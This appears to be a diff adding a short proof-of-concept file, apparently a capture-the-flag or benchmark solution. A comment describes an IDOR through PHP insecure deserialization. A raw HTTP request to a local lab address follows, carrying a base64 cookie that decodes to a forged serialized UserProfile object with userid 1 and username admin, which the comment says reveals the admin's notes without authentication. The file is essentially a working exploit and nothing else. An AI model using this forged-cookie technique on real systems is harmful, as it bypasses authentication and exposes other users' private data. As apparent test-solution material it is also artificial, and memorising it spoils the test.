@@ -1,0 +1,5 @@
+# IDOR via PHP insecure deserialization. Cookie 'data' contains base64-encoded PHP serialized UserProfile. Setting userid=1 shows admin's notes without authentication.
+
+GET / HTTP/1.1
+Host: 172.17.0.1:34705
+Cookie: data=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==
